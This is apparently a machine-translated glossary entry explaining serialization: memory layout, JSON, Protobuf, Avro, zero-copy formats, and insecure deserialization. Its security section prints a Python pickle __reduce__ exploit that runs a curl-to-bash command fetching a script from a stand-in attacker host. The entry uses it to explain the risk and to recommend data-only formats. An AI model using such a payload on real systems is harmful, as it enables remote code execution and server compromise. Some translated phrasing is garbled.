# What is Serialization?

*Dictionary · Dev · Last updated: September 19, 2026*

Serialization is the dynamic allocation of objects, data structures, and pointer graphics in the working memory (RAM) of a programming language; It is the process of converting data into a flat, linear byte stream or text format that can be transmitted over the network or stored on disk.

## What Does Serialization Mean and Why Is It Necessary? Memory Model

In modern operating systems, each process runs in its own isolated virtual address space. An object at runtime; It contains local variables on the stack, dynamically allocated memory blocks on the heap, function pointers (vtable) and reference addresses (0x7ffee4b2...).

This memory structure cannot be copied directly to another medium for two main reasons:

1. Address Space Isolation: Memory pointers are meaningful only in the virtual address table of the currently running process. When you send a memory pointer to another process on the same server or to a client on the network, a segmentation fault or memory corruption occurs on the target system.
2. Architecture and Endianness Differences: Different processor architectures (e.g., Little-Endian x86-64 vs. Big-Endian networking hardware) keep multibyte integers and floating-point numbers in memory in different byte ordering. Additionally, pointer widths and data alignments (padding) are different in 32-bit and 64-bit systems.

Serialization mechanism; It traverses or graph traverses the object graph in memory (including cyclic references), transforms local pointers into logical relations, and puts the data into a platform-independent canonical byte sequence.

***Analogy:** Moving a piece of furniture is like taking it apart and placing it in a flat and flat box; At the destination, you open the box and reassemble the furniture (deserialization) by consulting the manual.*

## Serialization Formats: Text-Based vs Binary

Choosing the right serialization format in software architecture; It requires a balance between human readability, CPU parsing cost, network bandwidth, and type safety.

- JSON (JavaScript Object Notation): The de facto standard of the modern web and RESTful APIs. It is language agnostic, natively supported in browsers, and easily read and debuggable by developers.
- Weaknesses: Text-based parsing (lexing, tokenizing, string-to-number conversions) consumes serious CPU. Repeating key names (field keys) in each record creates unnecessary payload overhead. Also, carrying binary data (e.g. an image or encrypted key) requires Base64 encoding; This inflates the data size by approximately 33%.

- Protocol Buffers (Protobuf): It is a binary format developed by Google that forms the backbone of gRPC and microservice communication. It defines field types and field numbers (field tags) with a solid schema file (.proto). Instead of text keys, numeric labels and variable-length integer encoding (Varint) are sent over the network. It consumes 3 to 10 times less bandwidth than JSON and parses much faster.
- Apache Avro: Common in the big data (Hadoop, Kafka) ecosystem. The schema is kept in a central registry (Schema Registry) rather than being embedded within each message. In this way, the additional load per message is minimized.
- MessagePack and BSON: Stores data in a binary compressed format, preserving JSON's flexible, schemaless key-value model.

## Zero-Copy Deserialization Architecture

In classic serialization libraries (JSON parsers or standard Protobuf) the deserialization process is carried out with these steps:

1. The byte stream coming from the network socket is written into a temporary buffer.
2. The parser verifies types by scanning bytes.
3. New memory is allocated for each object, string, and array in the heap area of ​​memory (malloc, or the language's memory manager).
4. Values ​​are copied from the buffer memory to the newly created heap objects.

In systems where hundreds of thousands of requests are processed per second, these heap allocations and copy operations lead to high CPU consumption and Garbage Collector pauses.

**Zero-Copy Approach (FlatBuffers, Cap'n Proto):** When data is serialized in these libraries, it is placed in the binary buffer in accordance with the memory alignment and relative offsets.

No memory allocation or data copying occurs during the Deserialization phase. The application maps (mmap) the incoming byte buffer directly into memory and accesses object fields directly by pointer arithmetic. Deserialization time is effectively 0 milliseconds. This architecture; It is standard in high-frequency trading (HFT), edge computing (Edge AI) and AAA game engines.

## Security Dimension: Insecure Deserialization (CWE-502)

Catastrophic security vulnerabilities arise when serialization attempts to serialize object classes and runtime behaviors rather than just moving pure data. Insecure Deserialization (Insecure Reverse Serialization), which is in the OWASP Top 10 list, allows the attacker to run arbitrary code (Remote Code Execution - RCE) on the system.

Python's built-in serialization module pickle serializes the __reduce__ method of objects. This method defines a function and its parameters to be called during object deserialization. By abusing this mechanism, an attacker can generate a malicious byte sequence that executes an operating system command:

```
# Saldırgan tarafından hazırlanan zararlı serileştirme paketi
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('curl -s https://attacker.com/steal.sh | bash',))
```

As soon as this byte stream is sent to the server and pickle.loads(payload) is executed, an unauthorized shell command is executed on the server. Therefore, any data from untrusted sources should not be parsed with pickle.

In Java's native serialization mechanism (ObjectInputStream.readObject()), the class loader loads the class of the incoming object into memory. Attacker; It can build an execution chain that runs commands on memory by connecting the methods of classes in libraries installed on the system (for example, Apache Commons Collections or Spring Framework) (gadget chain).

- Never use language-integrated formats containing executable code or class definitions (Python pickle, Java native serialization, PHP unserialize) at network boundaries.
- Choose formats that only carry pure data and validate the data structure against the schema (JSON + Pydantic/Zod or Protobuf).
- Implement authentication and message integrity control (HMAC or TLS) on binary data exchanges.

## Frequently asked questions

**What is the main difference between Serialization and Deserialization?**

Serialization is the process of converting live objects in memory into a stream of bytes/text that can be stored or transmitted. Deserialization is the process of reading and parsing this byte sequence and converting it into an object that works again in the target system's memory.

**When should Protobuf or FlatBuffers be used instead of JSON in web projects?**

For public web clients and public APIs, JSON is ideal due to its browser compatibility and ease of debugging. However, for internal microservices, mobile application backends or real-time data streams, Protobuf or FlatBuffers should be preferred to throttle network bandwidth and reduce CPU decomposition cost.

**How does the Insecure Deserialization attack work and how to prevent it?**

The attacker injects malicious functions or class structures into the serialized data to be executed during deserialization. When the server parses this data, system commands can be triggered. To prevent this, formats that carry class logic should be abandoned and only schema formats that carry pure data (Protobuf, JSON Schema) should be used.

**What does zero-copy deserialization mean?**

It is a technique of reading data directly with pointer offsets on the buffer memory, rather than copying the incoming byte stream by allocating new memory areas. It relieves the processor and garbage collector by resetting memory allocation.

**What is Schema Evolution? How to ensure backward and forward compatibility?**

Data models change as software is updated. Systems such as Protobuf and Avro give unique numerical IDs to fields, allowing old clients to ignore new fields (backward compatibility) and new clients to read old data with default values ​​(forward compatibility).

## Related terms

- [API](https://trescout.com/en/dictionary/api/)
- [Data Pipeline](https://trescout.com/en/dictionary/data-pipeline/)
- [Memory Management](https://trescout.com/en/dictionary/memory-management/)
- [Network Stack](https://trescout.com/en/dictionary/network-stack/)

## Related tools

- [YAML Cpp](https://trescout.com/en/discover/yaml-cpp/)

This explanation was written in plain language for TreScout and **machine-translated** from the Turkish original · the Turkish version prevails. If something looks wrong or missing, write to [hello@trescout.com](mailto:hello@trescout.com). [Read in Turkish →](https://trescout.com/dictionary/serialization/)

---
Source: TreScout Dictionary · https://trescout.com/en/dictionary/serialization/
